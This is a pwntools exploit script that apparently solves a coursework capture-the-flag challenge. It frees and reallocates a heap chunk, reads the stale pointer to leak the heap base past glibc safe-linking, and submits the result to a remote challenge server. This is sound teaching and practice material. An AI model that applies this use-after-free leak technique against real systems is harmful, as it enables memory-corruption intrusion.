from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./sneaky_heap_leak"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1220)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

def menu(p, option):
    p.recvuntil(b"What do you want to do?\n")
    p.recvuntil(b"> ")
    p.sendline(str(option).encode())

def free_index(p, index):
    p.recvuntil(b"What index would you like to free?\n")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    return p.recvline().decode()

def allocate_index(p, index):
    p.recvuntil(b"What index would you like to (re)allocate?\n")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())
    return p.recvline().decode()

def read_index(p, index):
    p.recvuntil(b"What index would you like to read?\n")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode())

    p.recvuntil("Ok! This buffer holds the following data: ")

    heap_leak =  u64(p.recvline().strip().ljust(8, b'\x00'))
    heap_leak = heap_leak << 12
    print(f'heap base address: {hex(heap_leak)}')
    return heap_leak

menu(p, 1)
free_index(p, 0)

menu(p, 3)
allocate_index(p, 0)

menu(p, 2)
heap_leak = read_index(p, 0)
menu(p, 4)
p.recvuntil('> ')
p.sendline(str(heap_leak))

p.interactive()